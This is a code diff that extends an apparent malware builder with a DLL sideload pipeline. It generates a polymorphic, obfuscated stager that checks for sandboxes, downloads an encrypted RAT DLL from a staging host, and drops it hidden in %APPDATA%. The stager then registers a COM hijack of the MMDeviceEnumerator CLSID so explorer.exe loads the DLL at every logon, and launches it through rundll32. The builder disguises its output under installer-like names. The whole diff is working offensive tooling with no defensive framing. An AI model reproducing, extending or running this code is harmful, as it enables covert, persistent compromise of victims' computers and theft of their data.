@@ -137,7 +137,7 @@ def xor_str(s, key_byte):
 class VMAssembler:
     def __init__(self):
         # Assign random unique byte values to each opcode (avoid 0x00)
-        vals = random.sample(range(1, 256), 12)
+        vals = random.sample(range(1, 256), 15)
         self.OP_NOP   = vals[0]
         self.OP_PUSH  = vals[1]
         self.OP_DEOBF = vals[2]
@@ -150,13 +150,18 @@ class VMAssembler:
         self.OP_ENVCK = vals[9]
         self.OP_HALT  = vals[10]
         self.OP_JUNK  = vals[11]
+        # DLL sideload opcodes
+        self.OP_HIDE    = vals[12]  # SetFileAttributesW(hidden+system)
+        self.OP_COMREG  = vals[13]  # Register COM hijack in HKCU
+        self.OP_LEXEC   = vals[14]  # LOLBAS exec via rundll32
         self.obf_key = os.urandom(16)
         self.program = bytearray()
 
     def used_opcodes(self):
         return {self.OP_NOP, self.OP_PUSH, self.OP_DEOBF, self.OP_FETCH,
                 self.OP_XDEC, self.OP_RDEC, self.OP_WFILE, self.OP_EXEC,
-                self.OP_SLEEP, self.OP_ENVCK, self.OP_HALT, self.OP_JUNK}
+                self.OP_SLEEP, self.OP_ENVCK, self.OP_HALT, self.OP_JUNK,
+                self.OP_HIDE, self.OP_COMREG, self.OP_LEXEC}
 
     def _emit(self, opcode):
         self.program.append(opcode)
@@ -241,6 +246,88 @@ class VMAssembler:
         self._emit(self.OP_HALT)
 
         # Random junk suffix (makes binary size less predictable)
+        for _ in range(random.randint(3, 10)):
+            self._emit_junk()
+
+        return bytes(self.program)
+
+    def assemble_dll(self, url, xor_key, rc4_key, drop_path, com_clsid, com_dll_name, sleep_ms):
+        """Assemble VM bytecode for DLL sideload pipeline.
+
+        Flow: env_check → sleep → download → decrypt → write DLL →
+              hide file → register COM hijack → sleep → LOLBAS exec (rundll32)
+        """
+        self.program = bytearray()
+
+        # Random junk prefix
+        for _ in range(random.randint(2, 6)):
+            if random.random() > 0.4:
+                self._emit_junk()
+            else:
+                self._emit(self.OP_NOP)
+
+        # ENVCK — sandbox/debugger check
+        self._emit(self.OP_ENVCK)
+        self._emit_junk()
+
+        # SLEEP — initial delay
+        self._emit_u16(self.OP_SLEEP, sleep_ms)
+        self._emit(self.OP_NOP)
+        self._emit_junk()
+
+        # PUSH URL → DEOBF → FETCH (download encrypted DLL)
+        self._emit_data(self.OP_PUSH, self._obfuscate(url))
+        self._emit(self.OP_DEOBF)
+        self._emit_junk()
+        self._emit(self.OP_FETCH)
+
+        for _ in range(random.randint(1, 3)):
+            self._emit_junk()
+
+        # RC4 decrypt
+        self._emit_data(self.OP_PUSH, self._obfuscate(rc4_key))
+        self._emit(self.OP_DEOBF)
+        self._emit(self.OP_NOP)
+        self._emit(self.OP_RDEC)
+        self._emit_junk()
+
+        # XOR decrypt
+        self._emit_data(self.OP_PUSH, self._obfuscate(xor_key))
+        self._emit(self.OP_DEOBF)
+        self._emit_junk()
+        self._emit(self.OP_XDEC)
+        self._emit(self.OP_NOP)
+
+        # WFILE — write DLL to %APPDATA%\<drop_path>
+        self._emit_data(self.OP_PUSH, self._obfuscate(drop_path))
+        self._emit(self.OP_DEOBF)
+        self._emit(self.OP_WFILE)
+        self._emit_junk()
+
+        # HIDE — set hidden+system attributes on dropped file
+        # stack[sp-1] = full path from WFILE (not consumed by HIDE)
+        self._emit(self.OP_HIDE)
+        self._emit_junk()
+
+        # COMREG — register COM hijack in HKCU
+        # stack[sp-1] already has full DLL path from WFILE
+        # Push CLSID below it: COMREG reads [sp-2]=CLSID, [sp-1]=full_path
+        self._emit_data(self.OP_PUSH, self._obfuscate(com_clsid))
+        self._emit(self.OP_DEOBF)
+        self._emit_junk()
+        self._emit(self.OP_COMREG)
+        self._emit_junk()
+
+        # Delay before LOLBAS exec — break temporal correlation
+        self._emit_u16(self.OP_SLEEP, random.randint(3000, 8000))
+        self._emit_junk()
+
+        # LEXEC — rundll32.exe <dropped_dll>,EntryPoint
+        self._emit(self.OP_LEXEC)
+
+        # HALT
+        self._emit(self.OP_HALT)
+
         for _ in range(random.randint(3, 10)):
             self._emit_junk()
 
@@ -669,6 +756,72 @@ def generate_stager_source(asm, bytecode, sandbox=True):
     halt_lines = [f"\t\t\treturn"]
     cases.append((asm.OP_HALT, halt_lines))
 
+    # -- HIDE (set hidden+system file attributes on stack top path) --
+    vHk, vHp, vHs = unique_ids(3, 4, 6)
+    hide_lines = [
+        f"\t\t\tif {vm_sp} >= 1 {B}",
+        f"\t\t\t\t{vHk} := syscall.NewLazyDLL({fn_dec}([]byte{B}{enc_str('kernel32.dll')}{E}, 0x{str_key:02x}))",
+        f"\t\t\t\t{vHp} := {vHk}.NewProc({fn_dec}([]byte{B}{enc_str('SetFileAttributesW')}{E}, 0x{str_key:02x}))",
+        f"\t\t\t\t{vHs}, _ := syscall.UTF16PtrFromString(string({vm_stk}[{vm_sp}-1]))",
+        f"\t\t\t\t{vHp}.Call(uintptr(unsafe.Pointer({vHs})), 0x06)",  # 0x06 = HIDDEN|SYSTEM
+        f"\t\t\t{E}",
+    ]
+    cases.append((asm.OP_HIDE, hide_lines))
+
+    # -- COMREG (register COM hijack in HKCU) --
+    # Stack after WFILE+PUSH: [sp-2]=DLL full path (from WFILE), [sp-1]=CLSID (just pushed)
+    # Writes: HKCU\Software\Classes\CLSID\{clsid}\InprocServer32 (Default)=dllpath, ThreadingModel=Both
+    vCa, vCr, vCk, vCd, vCh, vCv, vCt = unique_ids(7, 4, 6)
+    # Pre-encode strings containing backslashes (f-strings can't have backslashes)
+    enc_reg_prefix = enc_str('Software\\Classes\\CLSID\\')
+    enc_reg_suffix = enc_str('\\InprocServer32')
+    enc_advapi = enc_str('advapi32.dll')
+    enc_regcreate = enc_str('RegCreateKeyExW')
+    enc_regset = enc_str('RegSetValueExW')
+    enc_regclose = enc_str('RegCloseKey')
+    enc_both = enc_str('Both')
+    enc_threadmodel = enc_str('ThreadingModel')
+    comreg_lines = [
+        f"\t\t\tif {vm_sp} >= 2 {B}",
+        f"\t\t\t\t{vCa} := syscall.NewLazyDLL({fn_dec}([]byte{B}{enc_advapi}{E}, 0x{str_key:02x}))",
+        f"\t\t\t\t{vCr} := {vCa}.NewProc({fn_dec}([]byte{B}{enc_regcreate}{E}, 0x{str_key:02x}))",
+        f"\t\t\t\t{vCk}, _ := syscall.UTF16PtrFromString(",
+        f"\t\t\t\t\t{fn_dec}([]byte{B}{enc_reg_prefix}{E}, 0x{str_key:02x}) +",
+        f"\t\t\t\t\tstring({vm_stk}[{vm_sp}-1]) +",  # CLSID at top
+        f"\t\t\t\t\t{fn_dec}([]byte{B}{enc_reg_suffix}{E}, 0x{str_key:02x}))",
+        f"\t\t\t\tvar {vCh} uintptr",
+        f"\t\t\t\tvar {vCd} uint32",
+        f"\t\t\t\t{vCr}.Call(0x80000001, uintptr(unsafe.Pointer({vCk})), 0, 0, 0, 0x20006, 0, uintptr(unsafe.Pointer(&{vCh})), uintptr(unsafe.Pointer(&{vCd})))",
+        f"\t\t\t\tif {vCh} != 0 {B}",
+        f"\t\t\t\t\t{vCv} := {vCa}.NewProc({fn_dec}([]byte{B}{enc_regset}{E}, 0x{str_key:02x}))",
+        f"\t\t\t\t\t{vCt}, _ := syscall.UTF16FromString(string({vm_stk}[{vm_sp}-2]))",  # DLL path below CLSID
+        f"\t\t\t\t\t{vCv}.Call({vCh}, 0, 0, 1, uintptr(unsafe.Pointer(&{vCt}[0])), uintptr(len({vCt})*2))",
+        f"\t\t\t\t\t{vCt}, _ = syscall.UTF16FromString({fn_dec}([]byte{B}{enc_both}{E}, 0x{str_key:02x}))",
+        f"\t\t\t\t\t{vCk}, _ = syscall.UTF16PtrFromString({fn_dec}([]byte{B}{enc_threadmodel}{E}, 0x{str_key:02x}))",
+        f"\t\t\t\t\t{vCv}.Call({vCh}, uintptr(unsafe.Pointer({vCk})), 0, 1, uintptr(unsafe.Pointer(&{vCt}[0])), uintptr(len({vCt})*2))",
+        f"\t\t\t\t\t{vCa}.NewProc({fn_dec}([]byte{B}{enc_regclose}{E}, 0x{str_key:02x})).Call({vCh})",
+        f"\t\t\t\t{E}",
+        f"\t\t\t\t{vm_sp}--",  # pop CLSID, leave DLL path for LEXEC
+        f"\t\t\t{E}",
+    ]
+    cases.append((asm.OP_COMREG, comreg_lines))
+
+    # -- LEXEC (LOLBAS exec: rundll32.exe <dll_path>,EntryPoint) --
+    vLs, vLe, vLv, vLf, vLa = unique_ids(5, 4, 6)
+    lexec_lines = [
+        f"\t\t\tif {vm_sp} >= 1 {B}",
+        f"\t\t\t\t{vLs} := syscall.NewLazyDLL({fn_dec}([]byte{B}{enc_str('shell32.dll')}{E}, 0x{str_key:02x}))",
+        f"\t\t\t\t{vLe} := {vLs}.NewProc({fn_dec}([]byte{B}{enc_str('ShellExecuteW')}{E}, 0x{str_key:02x}))",
+        f"\t\t\t\t{vLv}, _ := syscall.UTF16PtrFromString({fn_dec}([]byte{B}{enc_str('open')}{E}, 0x{str_key:02x}))",
+        f"\t\t\t\t{vLf}, _ := syscall.UTF16PtrFromString({fn_dec}([]byte{B}{enc_str('rundll32.exe')}{E}, 0x{str_key:02x}))",
+        f"\t\t\t\t{vLa}, _ := syscall.UTF16PtrFromString(string({vm_stk}[{vm_sp}-1]) +",
+        f"\t\t\t\t\t{fn_dec}([]byte{B}{enc_str(',EntryPoint')}{E}, 0x{str_key:02x}))",
+        f"\t\t\t\t{vLe}.Call(0, uintptr(unsafe.Pointer({vLv})), uintptr(unsafe.Pointer({vLf})), uintptr(unsafe.Pointer({vLa})), 0, 0)",
+        f"\t\t\t\t{vm_sp}--",
+        f"\t\t\t{E}",
+    ]
+    cases.append((asm.OP_LEXEC, lexec_lines))
+
     # -- JUNK (skip data, call junk function) --
     junk2_name = junk_fns[min(1, len(junk_fns)-1)][0]
     junk_skip_lines = [
@@ -910,24 +1063,24 @@ def stage_compile_stager(stager_dir, output_name):
 
 
 # ============================================================
-# DLL BUILD — compile payload as DLL with sideloading support
+# DLL STAGE 1 — Compile DLL payload with COM hijack + sideloading
 # ============================================================
 
-def build_dll(raw_payload, output_name="payload.dll"):
-    """Build the payload as a DLL with version.dll proxy and OneDrive sideloading.
+def stage_compile_dll(raw_payload, xor_key, rc4_key, litterbox):
+    """Compile agent as DLL (c-shared), dual-layer encrypt, upload.
 
-    Usage: rundll32.exe payload.dll,EntryPoint
-    Stage 1: LOLBAS execution via rundll32 — copies itself to OneDrive dir + runs RAT
-    Stage 2: OneDrive.exe loads the sideloaded version.dll on next logon (persistence)
+    The DLL contains:
+    - Full RAT agent (runAgent)
+    - COM proxy (DllGetClassObject/DllCanUnloadNow → mmdevapi.dll)
+    - EntryPoint export for rundll32
+    - Self-sideload + COM hijack registration on init
     """
     base_dir = os.path.dirname(os.path.abspath(__file__))
 
     with tempfile.TemporaryDirectory() as tmpdir:
-        # Copy main agent source
         with open(os.path.join(tmpdir, "main.go"), "w", encoding="utf-8") as f:
             f.write(raw_payload)
 
-        # Copy DLL sideload source (version.dll proxy + entry points)
         dll_src = os.path.join(base_dir, "dll_sideload.go")
         if not os.path.exists(dll_src):
             raise Exception("dll_sideload.go not found — required for DLL build")
@@ -938,13 +1091,12 @@ def build_dll(raw_payload, output_name="payload.dll"):
         subprocess.run(["go", "get", "golang.org/x/sys/windows"], cwd=tmpdir, capture_output=True)
         subprocess.run(["go", "mod", "tidy"], cwd=tmpdir, capture_output=True)
 
-        out_path = os.path.join(os.getcwd(), output_name)
+        out_path = os.path.join(tmpdir, "payload.dll")
         env = os.environ.copy()
         env["GOOS"] = "windows"
         env["GOARCH"] = "amd64"
         env["CGO_ENABLED"] = "1"
 
-        # Cross-compiler for CGO (required for c-shared DLL build)
         cc = shutil.which("x86_64-w64-mingw32-gcc")
         if not cc:
             raise Exception(
@@ -955,36 +1107,77 @@ def build_dll(raw_payload, output_name="payload.dll"):
 
         log("Compiling DLL (c-shared, CGO, stripped)...")
         build = subprocess.run(
-            [
-                "go", "build",
-                "-buildmode=c-shared",
-                "-tags", "dll",
-                "-ldflags", "-s -w",
-                "-o", out_path,
-                ".",
-            ],
+            ["go", "build", "-buildmode=c-shared", "-tags", "dll",
+             "-ldflags", "-s -w", "-o", out_path, "."],
             cwd=tmpdir, capture_output=True, text=True, env=env,
         )
         if build.returncode != 0:
             raise Exception(f"DLL build failed:\n{build.stderr}")
 
-        if os.path.exists(out_path):
-            size = os.path.getsize(out_path)
-            log(f"SUCCESS: {output_name} ({size:,} bytes)", "OK")
-        else:
-            raise Exception("DLL binary not found after build")
+        with open(out_path, "rb") as f:
+            bin_data = f.read()
+        log(f"Compiled DLL: {len(bin_data):,} bytes", "OK")
 
-        # Clean up the .h header file that c-shared generates
-        header = out_path.replace(".dll", ".h")
-        if os.path.exists(header):
-            os.remove(header)
+        # Layer 1: XOR
+        bin_data = xor_bytes(bin_data, xor_key)
+        log("Layer 1: XOR encrypted", "OK")
 
-    print()
-    log("=== DLL Build Complete ===", "OK")
-    log(f"Execute: rundll32.exe {output_name},EntryPoint", "OK")
-    log(f"Drop path: %APPDATA%\\Microsoft\\Windows\\Shell\\ShellServiceHost.dll", "OK")
-    log(f"Persistence: COM hijack → explorer.exe loads DLL on every logon", "OK")
-    log(f"COM CLSID: {{BCDE0395-E52F-467C-8E3D-C4579291692E}} (MMDeviceEnumerator)", "OK")
+        # Layer 2: RC4
+        bin_data = rc4_crypt(bin_data, rc4_key)
+        log("Layer 2: RC4 encrypted", "OK")
+
+        enc_path = os.path.join(tmpdir, "payload.bin")
+        with open(enc_path, "wb") as f:
+            f.write(bin_data)
+
+        url = litterbox.upload(enc_path)
+        log("DLL payload uploaded to staging", "OK")
+        return url
+
+
+# ============================================================
+# DLL STAGE 3 — Generate DLL-aware stager with COM hijack + LOLBAS
+# ============================================================
+
+def stage_generate_dll_stager(payload_url, xor_key, rc4_key, sandbox=True):
+    """Generate polymorphic stager that drops DLL, registers COM hijack,
+    and executes via rundll32 (LOLBAS).
+    """
+    sleep_ms = random.randint(2000, 5000)
+
+    # Fixed drop path — must match dll_sideload.go constants
+    drop_path = "Microsoft/Windows/Shell/ShellServiceHost.dll"
+    com_clsid = "{BCDE0395-E52F-467C-8E3D-C4579291692E}"
+    com_dll_name = "ShellServiceHost.dll"  # resolved to full path by WFILE opcode
+
+    asm = VMAssembler()
+    bytecode = asm.assemble_dll(
+        url=payload_url,
+        xor_key=xor_key,
+        rc4_key=rc4_key,
+        drop_path=drop_path,
+        com_clsid=com_clsid,
+        com_dll_name=com_dll_name,
+        sleep_ms=sleep_ms,
+    )
+    log(f"DLL bytecode assembled: {len(bytecode)} bytes, {len(asm.used_opcodes())} opcodes", "OK")
+
+    source = generate_stager_source(asm, bytecode, sandbox=sandbox)
+    log(f"Polymorphic DLL stager generated ({len(source)} chars)", "OK")
+
+    tmpdir = tempfile.mkdtemp()
+    src_path = os.path.join(tmpdir, "main.go")
+    with open(src_path, "w", encoding="utf-8") as f:
+        f.write(source)
+
+    subprocess.run(["go", "mod", "init", "stager"], cwd=tmpdir, capture_output=True)
+
+    log(f"Drop target: {drop_path}", "OK")
+    log("COM hijack: MMDeviceEnumerator → explorer.exe persistence", "OK")
+    log("LOLBAS exec: rundll32.exe <dll>,EntryPoint", "OK")
+    if sandbox:
+        log("Anti-analysis: CPU check, timing check", "OK")
+    return tmpdir
 
 
 # ============================================================
@@ -1001,16 +1194,48 @@ def main():
         raw_payload = f.read()
     log(f"Loaded payload: main.go ({len(raw_payload)} chars)", "OK")
 
-    # --- DLL build mode ---
+    # --- DLL sideload mode → outputs EXE stager that drops DLL + COM hijack + rundll32 ---
     if "--dll" in sys.argv:
-        dll_names = ["api", "helper", "runtime", "bridge", "sync"]
-        output_name = sys.argv[sys.argv.index("--dll") + 1] if len(sys.argv) > sys.argv.index("--dll") + 1 and not sys.argv[sys.argv.index("--dll") + 1].startswith("-") else f"{random.choice(dll_names)}.dll"
-        if not output_name.endswith(".dll"):
-            output_name += ".dll"
-        log(f"DLL build mode — output: {output_name}")
+        name_prefixes = ["SetupHost", "Installer", "PkgSetup", "RuntimeSetup", "UpdateHelper"]
+        idx = sys.argv.index("--dll")
+        if idx + 1 < len(sys.argv) and not sys.argv[idx + 1].startswith("-"):
+            output_name = sys.argv[idx + 1]
+            if not output_name.endswith(".exe"):
+                output_name += ".exe"
+        else:
+            output_name = f"{random.choice(name_prefixes)}_{random.randint(100, 999)}.exe"
+        xor_key = generate_key(32)
+        rc4_key = generate_key(32)
+        litterbox = LitterboxAPI(retention="24h")
+
+        log(f"DLL sideload mode — final output: {output_name} (EXE)")
+        log(f"XOR Key: {xor_key}")
+        log(f"RC4 Key: {rc4_key}")
         print()
+
         try:
-            build_dll(raw_payload, output_name)
+            # STAGE 1: Compile DLL with COM hijack, encrypt, upload
+            log("--- Stage 1: Compile DLL Payload & Encrypt ---")
+            payload_url = stage_compile_dll(raw_payload, xor_key, rc4_key, litterbox)
+
+            # STAGE 2: Shorten URL
+            log("\n--- Stage 2: Shorten Payload URL ---")
+            short_url = URLShortener.shorten(payload_url)
+            log("Shortened URL ready", "OK")
+
+            # STAGE 3: Generate DLL-aware stager (COM hijack + LOLBAS)
+            log("\n--- Stage 3: Generate DLL Sideload Stager ---")
+            stager_dir = stage_generate_dll_stager(payload_url, xor_key, rc4_key)
+
+            # STAGE 4: Compile stager → final EXE
+            log("\n--- Stage 4: Compile Stager → EXE ---")
+            stage_compile_stager(stager_dir, output_name)
+
+            print()
+            log("=== DLL Sideload Pipeline Complete ===", "OK")
+            log(f"Output: {output_name} (run it — everything is automatic)", "OK")
+            log("Flow: EXE → downloads DLL → drops + hides → COM hijack → rundll32 LOLBAS", "OK")
+            log("Persistence: explorer.exe loads DLL via COM on every logon", "OK")
         except Exception as e:
             log(f"Stopped: {e}", "ERR")
             sys.exit(1)
